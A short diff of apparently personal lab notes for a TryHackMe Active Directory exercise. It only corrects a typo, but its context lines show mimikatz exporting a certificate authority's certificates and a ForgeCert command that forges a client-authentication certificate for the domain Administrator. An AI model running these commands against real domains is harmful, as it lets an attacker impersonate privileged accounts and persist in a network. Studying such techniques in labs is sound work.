@@ -21,7 +21,7 @@ crypto::certificates /systemstore:local_machine /export
 ```
 Transfer both .pfx and .der certificate files to non domain machine for safe keeping and safer certificate generation.
 
-Use SpectreOps's [ForgeCert](https://github.com/GhostPack/ForgeCert) to forge a Client Authenication certificate.
+Use SpectreOps's [ForgeCert](https://github.com/GhostPack/ForgeCert) to forge a Client Authentication certificate.
 ```powershell
 # --SubjectAltName is User principle name UPN 
 ForgeCert.exe --CaCertPath $exportedCAcertificate --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath $NewCertName.pfx --NewCertPassword Password123
